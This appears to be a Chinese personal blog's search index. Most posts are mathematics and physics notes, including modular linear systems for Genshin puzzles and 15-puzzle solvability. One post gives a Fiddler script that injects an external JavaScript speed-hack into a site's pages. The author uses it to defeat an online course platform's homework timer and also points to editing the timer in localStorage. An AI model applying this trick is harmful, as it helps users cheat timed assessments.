<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>一类灵感来自稻妻解谜的谜题的通用解法</title>
    <link href="/2022/02/14/%E5%8E%9F%E7%A5%9E%E7%A8%BB%E5%A6%BB%E4%B8%AD%E4%B8%80%E7%B1%BB%E8%A7%A3%E8%B0%9C%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E6%B3%95/"/>
    <url>/2022/02/14/%E5%8E%9F%E7%A5%9E%E7%A8%BB%E5%A6%BB%E4%B8%AD%E4%B8%80%E7%B1%BB%E8%A7%A3%E8%B0%9C%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="经过抽象并推广的谜题模型">经过抽象并推广的谜题模型</h2><h3 id="谜题">谜题</h3><p><span class="math inline">\(a_1,a_2,\cdots,a_n\)</span>是整数变量（模<span class="math inline">\(m\)</span>剩余类）。<span class="math inline">\(P_1,P_2,\cdots,P_k\)</span>为<span class="math inline">\(k\)</span>个操作，操作<span class="math inline">\(P_i\)</span>使<span class="math inline">\(a_1,a_2,\cdots,a_n\)</span>数值分别增加<span class="math inline">\(P_{i1},P_{i2},\cdots,P_{in}.\quad(i=1,2,\cdots,k)\)</span> （模<span class="math inline">\(m\)</span>意义下）</p><p>给定<span class="math inline">\(a_1,a_2,\cdots,a_n\)</span>的初始值，试求有限的操作序列使<span class="math inline">\(a_1,a_2,\cdots,a_n\)</span>变为同一个数。（模<span class="math inline">\(m\)</span>意义下）</p><h3 id="解法">解法</h3><p>由加法交换律，操作的顺序并不影响结果。设<span class="math inline">\(P_1,P_2,\cdots,P_k\)</span>分别进行了<span class="math inline">\(x_1,x_2,\cdots,x_k\)</span>次，则<span class="math inline">\(a_1,a_2,\cdots,a_n\)</span>变为<span class="math inline">\(a_1+x_1P_{11}+x_2P_{21}+\cdots+x_kP_{k1},a_2+x_1P_{12}+x_2P_{22}+\cdots+x_kP_{k2},\cdots,a_n+x_1P_{1n}+x_2P_{2n}+\cdots+x_kP_{kn}\)</span></p><p>即<span class="math display">\[S&#39;=S+PX\]</span></p><p>其中 <span class="math inline">\(S&#39;=\begin{bmatrix}  a_1&#39;  \\a_2&#39;  \\\vdots  \\a_n&#39;  \end{bmatrix},\)</span> <span class="math inline">\(S=\begin{bmatrix}  a_1  \\a_2  \\\vdots  \\a_n  \end{bmatrix},\)</span> <span class="math inline">\(X=\begin{bmatrix}  x_1  \\x_2  \\\vdots  \\x_n  \end{bmatrix},\)</span> 不妨将操作<span class="math inline">\(P_i\)</span>记为向量 <span class="math inline">\(\begin{bmatrix}  P_{i1}  \\P_{i2}  \\\vdots  \\P_{in}  \end{bmatrix}\)</span> 则<span class="math inline">\(P=\begin{bmatrix}P_1&amp;P_2&amp;\cdots&amp;P_k\end{bmatrix}\)</span></p><p>变形得到</p><p><span class="math display">\[PX=S&#39;-S\]</span></p><p>这是一个模<span class="math inline">\(m\)</span>意义下的线性方程组。我们只要给出一个解就解决了问题。</p><p>如果<span class="math inline">\(m\)</span>为质数，则除<span class="math inline">\([0]\)</span>以外都有数论倒数。任取符合要求（即所有数相等）的<span class="math inline">\(S&#39;,\)</span>使用高斯消元法即可解决问题。</p><p><span class="math inline">\(m\)</span>为质数的幂时，设<span class="math inline">\(m=p^t\)</span>，作高斯消元法，当进行到某一列时，若对角线元素无数论倒数（即有因子<span class="math inline">\(p\)</span>），则在下方将被消除的元素中找到与<span class="math inline">\(p\)</span>互质的元素，两者所在两行交换，便可正常进行消元。若所有将被消除 的元素中均是<span class="math inline">\(p\)</span>的倍数，则选取因子<span class="math inline">\(p\)</span>的次数最小的元素与原来的对角线元素所在两行对换，消元可正常进行。</p><p><span class="math inline">\(m\)</span>为一般合数时，分解为不同质数的幂相乘的形式，分别改写成模不同质数的幂的线性方程组的形式并解之，最后用中国剩余定理合并解即可。</p><p><span class="math inline">\(m\)</span>不为质数的情况任选<span class="math inline">\(S&#39;\)</span>可能无解，因此需要枚举<span class="math inline">\(O(m)\)</span>个<span class="math inline">\(S&#39;\)</span>来寻找解。若<span class="math inline">\(m\)</span>较大，计算上建议记录高斯消元法的步骤（表示为左乘原系数矩阵的矩阵）。</p><h2 id="应用于原神解谜">应用于原神解谜</h2><p>原神中相关谜题之于上述模型是特例中的特例，虽然简单但也正是这些谜题引出了上述问题与思考。</p><img src="/2022/02/14/%E5%8E%9F%E7%A5%9E%E7%A8%BB%E5%A6%BB%E4%B8%AD%E4%B8%80%E7%B1%BB%E8%A7%A3%E8%B0%9C%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E6%B3%95/1.png" class="" title="解谜"><p>如图谜题，即对其中某一方块，攻击之可改变自己和其余方块上的数字（以模<span class="math inline">\(3\)</span>加法的形式），原神中应该都具体为自己和相邻方块数字+1。解密目标为通过一连串攻击操作使所有方块数字相同。</p><p>游戏内另有一类解密与此方块相同，但攻击是改变朝向，目标为所有方块朝向一致，与上述数字型解密内核相同。数字型是模<span class="math inline">\(3,\)</span>朝向型是模<span class="math inline">\(4,\)</span>即<span class="math inline">\(m=3\)</span>或<span class="math inline">\(4\)</span></p><p>对于有<span class="math inline">\(n\)</span>个方块的谜题，<span class="math inline">\(n\)</span>个方块上现有的数字即为<span class="math inline">\(S.\ n\)</span>个方块正对应<span class="math inline">\(n\)</span>个操作，可按照操作的影响写出矩阵<span class="math inline">\(P.\)</span>解方程组得到答案。</p><p>以图中谜题为例， <span class="math inline">\(P=\begin{bmatrix}  1&amp;1&amp;0&amp;0&amp;0  \\1&amp;1&amp;1&amp;0&amp;0  \\0&amp;1&amp;1&amp;1&amp;0  \\0&amp;0&amp;1&amp;1&amp;1  \\0&amp;0&amp;0&amp;1&amp;1  \end{bmatrix},\)</span> <span class="math inline">\(S=\begin{bmatrix}  1  \\1  \\2  \\1  \\1  \end{bmatrix},\)</span> 此处模数<span class="math inline">\(3\)</span>为质数，故<span class="math inline">\(S&#39;\)</span>可任取，这里取 <span class="math inline">\(S&#39;=\begin{bmatrix}  0  \\0  \\0  \\0  \\0  \end{bmatrix}.\)</span></p><p>得到方程 <span class="math inline">\(\begin{bmatrix}  1&amp;1&amp;0&amp;0&amp;0  \\1&amp;1&amp;1&amp;0&amp;0  \\0&amp;1&amp;1&amp;1&amp;0  \\0&amp;0&amp;1&amp;1&amp;1  \\0&amp;0&amp;0&amp;1&amp;1  \end{bmatrix}  \begin{bmatrix}  x_1  \\x_2  \\x_3  \\x_4  \\x_5  \end{bmatrix}\equiv  \begin{bmatrix}  2  \\2  \\1  \\2  \\2  \end{bmatrix} \pmod 3\)</span></p><p>给出一个解：<span class="math inline">\(X=(2,0,0,1,1)^T,\)</span>即攻击最左边的方块两次，最右边的两个方块分别一次即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>数学</tag>
      
      <tag>原神</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数字推盘(数字华容道)的可解性</title>
    <link href="/2021/04/10/%E6%95%B0%E5%AD%97%E6%8E%A8%E7%9B%98-%E6%95%B0%E5%AD%97%E5%8D%8E%E5%AE%B9%E9%81%93-%E7%9A%84%E5%8F%AF%E8%A7%A3%E6%80%A7/"/>
    <url>/2021/04/10/%E6%95%B0%E5%AD%97%E6%8E%A8%E7%9B%98-%E6%95%B0%E5%AD%97%E5%8D%8E%E5%AE%B9%E9%81%93-%E7%9A%84%E5%8F%AF%E8%A7%A3%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zh.wikipedia.org/zh-cn/%E6%95%B8%E5%AD%97%E6%8E%A8%E7%9B%A4%E9%81%8A%E6%88%B2">数字推盘游戏 - 维基百科</a></p><h1 id="固定一个空位时的情形">固定一个空位时的情形</h1><p>在一个 <span class="math inline">\((n^2-1)\text{-puzzle}\)</span> 中，固定空位的位置并设定一个初始状态，则 <span class="math inline">\((n^2-1)\)</span> 个方块的状态可表示为一个置换（初始状态即为恒等函数）。称一个游戏状态合法，是指该状态可由初始状态进行若干次操作获得（当然最终的空位位置和原来是一样的）。</p><p>我们将证明，游戏状态合法当且仅当该状态为偶置换。</p><hr /><h2 id="rightarrow"><span class="math inline">\(\Rightarrow:\)</span></h2><p>对于一个合法的游戏状态，考虑从初始状态进行若干次操作的过程。</p><p>按照游戏规则，可进行的操作都可以分解为几个基本操作的组合，而基本操作就是空位和上下左右某一块的对换。</p><p>我们只关注空位的轨迹，水平方向上的对换不影响空位的纵坐标，竖直方向上的对换使空位的纵坐标<span class="math inline">\(\pm 1.\)</span> 最终空位位置必须和初始状态相同，因此竖直方向上的对换必为偶数次。</p><p>同理，水平方向上的对换也为偶数次，因此该状态是偶数次对换的复合，即为偶置换。</p><h2 id="leftarrow"><span class="math inline">\(\Leftarrow:\)</span></h2><p>易证任何偶置换可以分解为若干 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span> 的复合。只需证明用基本操作能实现 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span>（不含空位） 即可，此时 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span> 不改变状态的合法性。</p><p>引理1 <span class="math inline">\(2\times 2\)</span> 正方形中三个非空位块的 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span> 不改变合法性。</p><p>记空位为 <span class="math inline">\(0.\)</span></p><p>对于含有空位的<span class="math inline">\(2\times 2\)</span> 正方形中三个非空块的置换，注意到 <span class="math inline">\((3\ 0)(1\ 3)(2\ 1)(0\ 2)=(1\ 2\ 3)(0),\)</span> 另一种 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span> 同理。</p><p>对于不含空位的 <span class="math inline">\(2\times 2\)</span> 正方形中任意三个块的置换，记这三个块为 <span class="math inline">\(1,2,3,\)</span> 记不动的块为 <span class="math inline">\(4.\)</span></p><ol type="1"><li><p><span class="math inline">\(4\)</span> 不在盘的四角。</p><p>总能找到一系列基本操作（它们是对换）<span class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_t,\)</span> 其中 <span class="math inline">\(\alpha_i(1\le i \le t)\)</span> 固定 <span class="math inline">\(1,2,3,\)</span> 并且 <span class="math inline">\(\alpha_t\alpha_{t-1}\dots\alpha_1(0)=4.\)</span> 首先依次做 <span class="math inline">\(\alpha_1,\alpha_2,\dots,\alpha_t\)</span> 的操作，此时 <span class="math inline">\(0\)</span> 已经在正方形中，因此按照前面的结论，此时复合 <span class="math inline">\((1\ 2\ 3)\)</span> 不改变合法性。 于是<span class="math inline">\(\alpha_1^{-1}\alpha_2^{-1}\dots\alpha_t^{-1}(1\ 2\ 3)\alpha_t\alpha_{t-1}\dots\alpha_1\)</span> 不改变合法性，而由于 <span class="math inline">\(\alpha_i(1\le i \le t)\)</span> 固定 <span class="math inline">\(1,2,3,\)</span> 于是该操作正是 <span class="math inline">\((1\ 2\ 3).\)</span> <span class="math inline">\((1\ 3\ 2)\)</span> 同理。</p></li><li><p><span class="math inline">\(4\)</span> 恰在盘的四角。</p><p>注意到 <span class="math inline">\((1\ 4\ 3)(1\ 2\ 4)=(1\ 2\ 3),\)</span> 其中<span class="math inline">\((1\ 4\ 3)\)</span> 和 <span class="math inline">\((1\ 2\ 4)\)</span> 由1中的结论知不改变合法性，故 <span class="math inline">\((1\ 2\ 3)\)</span> 不改变合法性，<span class="math inline">\((1\ 3\ 2)\)</span> 同理。<span class="math inline">\(\Box\)</span></p></li></ol><p>引理2 连续三个水平（竖直）的非空位块的 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span> 不改变合法性。</p><p>对于三个水平相接或竖直相接的非空位块，至少在一个不在角落的 <span class="math inline">\(2\times 3\)</span> 的矩形中。如果矩形中没有空位，按先长边后短边的顺序标号为 <span class="math inline">\(1,2,3,4,5,6,\)</span> 有 <span class="math inline">\((2\ 5\ 3)(1\ 5\ 2)=(1\ 3\ 2),\)</span> 即该三块的 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span> 不改变合法性。如果矩形中有空位，只需一次对换 <span class="math inline">\(\alpha\)</span> 即可移出，再作所需置换 <span class="math inline">\(\beta,\)</span> 两者不相交，此时作 <span class="math inline">\(\alpha^{-1}\beta\alpha,\)</span> 结果正是所需的 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span> 即 <span class="math inline">\(\beta,\)</span> 于是得到了同样的结论。<span class="math inline">\(\Box\)</span></p><p>接下来证明不含空位的 <span class="math inline">\(3\operatorname{-}\text{cycle}\)</span> 不改变合法性。</p><p>记盘中 <span class="math inline">\((n^2-1)\)</span> 个非空位位置从左到右从上到下依次为 <span class="math inline">\(1,2,3,\dots,n^2-1,\)</span> 要置换的三个块为 <span class="math inline">\(a,b,c.\)</span></p><p>首先要把 <span class="math inline">\(a,b,c\)</span> 移动至 <span class="math inline">\(1,2,n+1\)</span>（这里假定 <span class="math inline">\(1,2,n+1\)</span> 没有空位，如果有则改为移动至<span class="math inline">\(n^2-n,n^2-1,n^2,\)</span> 考虑对称性，这里只讨论<span class="math inline">\(1,2,n+1\)</span>），由引理2这是显然可行的。记该操作为 <span class="math inline">\(\alpha,\)</span> 则 <span class="math inline">\(\alpha(a)=1,\alpha(b)=2,\alpha(c)=n+1.\)</span></p><p>给出操作 <span class="math inline">\(\alpha^{-1}(1\quad 2\quad n+1)\alpha,\)</span> 该操作能分解为基本操作，且它等于 <span class="math inline">\((\alpha^{-1}(1)\quad \alpha^{-1}(2)\quad \alpha^{-1}(n+1))=(a\ b\ c). \quad \Box\)</span></p><h1 id="可解性">可解性</h1><p>将右下角的格染成白色，然后将其他格染成黑色或白色使得黑白不相邻（实际上就是按横坐标+纵坐标的奇偶性分类）。注意到把空位从黑色格移到右下角需要奇数次对换，从白色格移到右下角需要偶数次对换。</p><p>设定还原状态为初始状态。由前面的结论知：<span class="math inline">\((n^2-1)\text{-puzzle}\)</span> 是可解的，当且仅当，空位在白色块且方块为偶置换，或空位在黑色块且方块为奇置换。</p><hr /><p>我们完成了可解性的讨论，并实际上给出了一种该游戏的玩法（虽然并不方便）：按照证明中的步骤不停地做三块轮换即可。引理2确实是很有用的，比如在 <span class="math inline">\(15\text{-puzzle}\)</span> 中，你可用引理2的操作来解决最后一行。</p>]]></content>
    
    
    
    <tags>
      
      <tag>数学</tag>
      
      <tag>置换</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过 Fiddler 修改响应体实现网站全局 JS 的变速齿轮功能</title>
    <link href="/2020/03/05/%E9%80%9A%E8%BF%87-Fiddler-%E4%BF%AE%E6%94%B9%E5%93%8D%E5%BA%94%E4%BD%93%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%AB%99%E5%85%A8%E5%B1%80-JS-%E7%9A%84%E5%8F%98%E9%80%9F%E9%BD%BF%E8%BD%AE%E5%8A%9F%E8%83%BD/"/>
    <url>/2020/03/05/%E9%80%9A%E8%BF%87-Fiddler-%E4%BF%AE%E6%94%B9%E5%93%8D%E5%BA%94%E4%BD%93%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%AB%99%E5%85%A8%E5%B1%80-JS-%E7%9A%84%E5%8F%98%E9%80%9F%E9%BD%BF%E8%BD%AE%E5%8A%9F%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<p>使用轮子: jsgear</p><p>打开 Fiddler 4, 按下 Ctrl-R 以打开 Fiddler ScriptEditor.</p><p>找到方法 OnBeforeResponse, 在方法的最后添加代码:</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> (oSession.uri<span class="hljs-constructor">Contains(&#x27;<span class="hljs-params">xxxxxx</span>.<span class="hljs-params">xxx</span><span class="hljs-operator">/</span><span class="hljs-params">xxxxxx</span>&#x27;)</span><span class="hljs-operator"> &amp;&amp; </span>oSession.oResponse.headers.<span class="hljs-constructor">ExistsAndContains(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;text/html&quot;</span>)</span>) &#123;<br>    oSession.util<span class="hljs-constructor">DecodeResponse()</span>;<br>    oSession.util<span class="hljs-constructor">ReplaceInResponse(&#x27;&lt;<span class="hljs-params">head</span>&gt;&#x27;,&#x27;&lt;<span class="hljs-params">head</span>&gt;&lt;<span class="hljs-params">script</span> <span class="hljs-params">src</span>=<span class="hljs-string">&quot;https://www.etherdream.com/JSGear/jsgear.js&quot;</span>&gt;&lt;<span class="hljs-operator">/</span><span class="hljs-params">script</span>&gt;&#x27;)</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>xxxxxx.xxx/xxxxxx 为要适用的网址</p><p>打开指定网页(通过 Fiddler 代理), 响应体将被修改, jsgear 将被插入到所有脚本之前</p><p>测试某网课平台的作业计时:</p><img src="/2020/03/05/%E9%80%9A%E8%BF%87-Fiddler-%E4%BF%AE%E6%94%B9%E5%93%8D%E5%BA%94%E4%BD%93%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%AB%99%E5%85%A8%E5%B1%80-JS-%E7%9A%84%E5%8F%98%E9%80%9F%E9%BD%BF%E8%BD%AE%E5%8A%9F%E8%83%BD/114514.png" class="" title="いいよ"><p>提交可成功。(事实上对于该网课平台，时间保存在 localStorage 中，直接用 Chrome 开发者工具修改即可)</p>]]></content>
    
    
    
    <tags>
      
      <tag>javascript</tag>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello, 2020</title>
    <link href="/2020/01/24/Hello-2020/"/>
    <url>/2020/01/24/Hello-2020/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>单调连续函数定积分与数列求和的关系</title>
    <link href="/2019/06/07/%E5%8D%95%E8%B0%83%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E6%95%B0%E5%88%97%E6%B1%82%E5%92%8C%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <url>/2019/06/07/%E5%8D%95%E8%B0%83%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E6%95%B0%E5%88%97%E6%B1%82%E5%92%8C%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="定理">定理</h3><p>对连续函数<span class="math inline">\(f(x)\)</span>和<span class="math inline">\(p,q \in \mathbb{Z}\)</span>且<span class="math inline">\(p&lt;q:\)</span></p><p>若<span class="math inline">\(f(x)\)</span>单调递增, 则</p><p><span class="math display">\[\int_{a-1}^b f(x)\mathrm{d}x&lt;\sum_{i=a}^bf(i)&lt;\int_a^{b+1}f(x)\mathrm{d}x\]</span></p><p>若<span class="math inline">\(f(x)\)</span>单调递减, 则</p><p><span class="math display">\[\int_{a-1}^b f(x)\mathrm{d}x&gt;\sum_{i=a}^bf(i)&gt;\int_a^{b+1}f(x)\mathrm{d}x\]</span></p><hr /><blockquote><p>由图像法可以很容易得出<span class="math inline">\(\forall x \in [a-1,b+1]:f(x)&gt;0\)</span>条件下该定理的证明</p></blockquote><p>下面给出一般的代数证明(只证明<span class="math inline">\(f(x)\)</span>单调递增时<span class="math inline">\(\sum_{i=a}^bf(i)&lt;\int_a^{b+1}f(x)\mathrm{d}x\)</span>, 其他同理可证)</p><h3 id="证明">证明</h3><p>由于<span class="math inline">\(f(x)\)</span>连续, 记<span class="math inline">\(F(x)\)</span>为<span class="math inline">\(f(x)\)</span>的一个原函数, 有<span class="math inline">\(F&#39;(x)=f(x)\)</span></p><p><span class="math inline">\(\forall n \in [a,b] \cap \mathbb{Z},\)</span>由拉格朗日中值定理得 <span class="math display">\[\exists \xi \in (n,n+1): F&#39;(\xi)=\frac{F(n+1)-F(n)}{(n+1)-n}=F(n+1)-F(n)\]</span> 即 <span class="math display">\[f(\xi)=F(n+1)-F(n)\]</span></p><p>由于<span class="math inline">\(n&lt;\xi\)</span>且<span class="math inline">\(f(x)\)</span>单调递增</p><p><span class="math display">\[f(n)&lt;f(\xi)=F(n+1)-F(n)\]</span></p><p>即 <span class="math display">\[\forall n \in [a,b]: f(n)&lt;F(n+1)-F(n)=F(x)\Big|^{n+1}_n=\int_n^{n+1}f(x)\mathrm{d}x\]</span></p><p>累加得</p><p><span class="math display">\[\sum_{i=a}^b f(i)&lt;\sum_{i=a}^b \int_i^{i+1}f(x)\mathrm{d}x=\int_a^{b+1}f(x)\mathrm{d}x\]</span></p>]]></content>
    
    
    
    <tags>
      
      <tag>数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>多项式数列求和的计算方式</title>
    <link href="/2019/03/23/%E5%A4%9A%E9%A1%B9%E5%BC%8F%E6%95%B0%E5%88%97%E6%B1%82%E5%92%8C%E7%9A%84%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F/"/>
    <url>/2019/03/23/%E5%A4%9A%E9%A1%B9%E5%BC%8F%E6%95%B0%E5%88%97%E6%B1%82%E5%92%8C%E7%9A%84%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>求多项式数列 <span class="math inline">\(a_n=f(n)\)</span> 的前<span class="math inline">\(n\)</span>项和, 只需找出 <span class="math inline">\(\sum_{i=1}^n i^k\)</span> 的计算方法, 其中 <span class="math inline">\(k\in \mathbb{N}\)</span></p><p><span class="math inline">\(k=0\)</span> 时, <span class="math inline">\(\sum_{i=1}^n i^k=n\)</span></p><p><span class="math inline">\(k=1\)</span> 时, <span class="math inline">\(\sum_{i=1}^n i^k=\frac{n(n+1)}{2}\)</span></p><p>对于一般的 <span class="math inline">\(k\)</span>, 可用以下方式递归求得</p><p><span class="math display">\[\sum_{i=1}^n((i+1)^{k+1}-i^{k+1})=\sum_{i=1}^n \sum_{j=0}^k \binom{k+1}{j}i^j\]</span></p><p><span class="math display">\[(n+1)^{k+1}-1=\sum_{j=0}^k \sum_{i=1}^n \binom{k+1}{j}i^j=\sum_{j=0}^{k-1} \binom{k+1}{j} \sum_{i-1}^{n}i^j+(k+1)\sum_{i=1}^n i^k\]</span></p><p><span class="math display">\[\therefore \sum_{i=1}^n i^k=\frac{1}{k+1}((n+1)^{k+1}-\sum_{j=0}^{k-1} \binom{k+1}{j} \sum_{i=1}^n i^j)\]</span></p><p>其中右侧的 <span class="math inline">\(\sum_{i=1}^n i^j\)</span> 中 <span class="math inline">\(j&lt;k\)</span>, 即求得 <span class="math inline">\(k=0,1,2,...,m-1\)</span> 的答案就能求出 <span class="math inline">\(k=m\)</span> 的答案.</p>]]></content>
    
    
    
    <tags>
      
      <tag>数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机车启动问题-恒定功率启动 状态分析</title>
    <link href="/2019/01/05/%E6%9C%BA%E8%BD%A6%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98-%E6%81%92%E5%AE%9A%E5%8A%9F%E7%8E%87%E5%90%AF%E5%8A%A8-%E7%8A%B6%E6%80%81%E5%88%86%E6%9E%90/"/>
    <url>/2019/01/05/%E6%9C%BA%E8%BD%A6%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98-%E6%81%92%E5%AE%9A%E5%8A%9F%E7%8E%87%E5%90%AF%E5%8A%A8-%E7%8A%B6%E6%80%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>常量: 功率 <span class="math inline">\(P\)</span>, 阻力 <span class="math inline">\(f\)</span>, 质量 <span class="math inline">\(m\)</span> 变量: 牵引力 <span class="math inline">\(F\)</span>, 速度 <span class="math inline">\(v\)</span>, 加速度 <span class="math inline">\(a\)</span></p><p>两个方程:</p><p><span class="math display">\[P=Fv\]</span></p><p><span class="math display">\[ma=F-f\]</span></p><p>初始条件:</p><p><span class="math display">\[v(0)=0\]</span></p><p>由方程可得 <span class="math display">\[m \frac{\mathrm{d}v}{\mathrm{d}t}=\frac{P}{v}-f\]</span> <span class="math display">\[\therefore t=\int \frac{mv}{P-fv}\mathrm{d}v\]</span></p><p>一个简单的换元可得 <span class="math display">\[t=-m(\frac{P}{f^2}\mathrm{ln}(P-fv)-\frac{P-fv}{f^2})+C\]</span></p><p>根据初始条件得 <span class="math display">\[t=-m(\frac{P}{f^2}\mathrm{ln}\frac{P-fv}{P}+\frac{v}{f})\]</span></p><p>我们已经有了 <span class="math inline">\(t(v)\)</span> 的解析式, 求其反函数即可得 <span class="math inline">\(v(t),\)</span> 然而 <span class="math inline">\(v(t)\)</span> 并不是一个初等函数 <span class="math display">\[v=\frac{P}{f}(1+\mathrm{W}(-\mathrm{e}^{-1-\frac{f^2 t}{mP}}))\]</span> 其中 <span class="math inline">\(\mathrm{W}(x)\)</span> 为 Lambert W Function</p><p>不清楚<span class="math inline">\(v(t)\)</span>并不妨碍给出以下结论。由 <span class="math inline">\(t(v)\)</span> 可知, <span class="math inline">\(v\to \frac{P}{f}\)</span>时, <span class="math inline">\(t\to +\infty\)</span>. <span class="math inline">\(v\)</span> 趋向于 <span class="math inline">\(\frac{P}{f}\)</span> 而并不能达到. 雨滴下落、通电直导线磁场中下落等情景有类似结论。</p>]]></content>
    
    
    
    <tags>
      
      <tag>数学</tag>
      
      <tag>物理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Happy New Year! 2019</title>
    <link href="/2019/01/01/Happy-New-Year-2019/"/>
    <url>/2019/01/01/Happy-New-Year-2019/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[不务正业]毫无技术含量的Q群复读机分析器</title>
    <link href="/2018/08/27/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A-%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84Q%E7%BE%A4%E5%A4%8D%E8%AF%BB%E6%9C%BA%E5%88%86%E6%9E%90%E5%99%A8/"/>
    <url>/2018/08/27/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A-%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84Q%E7%BE%A4%E5%A4%8D%E8%AF%BB%E6%9C%BA%E5%88%86%E6%9E%90%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>复读机们试图统计群成员中有多少复读机。Naive!</p><p>不是复读机不是合格的群友, 快退群吧。</p><p>我基于 qqbot 写了一个复读分析的<a href="https://github.com/idkidknow/repeater_analyzer">程序</a>，跑去群里测试。</p><img src="/2018/08/27/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A-%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84Q%E7%BE%A4%E5%A4%8D%E8%AF%BB%E6%9C%BA%E5%88%86%E6%9E%90%E5%99%A8/1.png" class="" title="测试"><p>众人成测试工程师。</p><img src="/2018/08/27/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A-%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84Q%E7%BE%A4%E5%A4%8D%E8%AF%BB%E6%9C%BA%E5%88%86%E6%9E%90%E5%99%A8/2.png" class="" title="复读"><p>A few moments later.</p><img src="/2018/08/27/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A-%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84Q%E7%BE%A4%E5%A4%8D%E8%AF%BB%E6%9C%BA%E5%88%86%E6%9E%90%E5%99%A8/3.png" class="" title="复读"><p>这样的递归复读法运作起来毫无问题，但是观感极差，于是我加了个过滤器。</p><img src="/2018/08/27/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A-%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84Q%E7%BE%A4%E5%A4%8D%E8%AF%BB%E6%9C%BA%E5%88%86%E6%9E%90%E5%99%A8/4.png" class="" title="复读"><p>控制符是极具观赏性的玩法 (</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数学归纳法的又一妙用</title>
    <link href="/2018/07/22/%E6%95%B0%E5%AD%A6%E5%BD%92%E7%BA%B3%E6%B3%95%E7%9A%84%E5%8F%88%E4%B8%80%E5%A6%99%E7%94%A8/"/>
    <url>/2018/07/22/%E6%95%B0%E5%AD%A6%E5%BD%92%E7%BA%B3%E6%B3%95%E7%9A%84%E5%8F%88%E4%B8%80%E5%A6%99%E7%94%A8/</url>
    
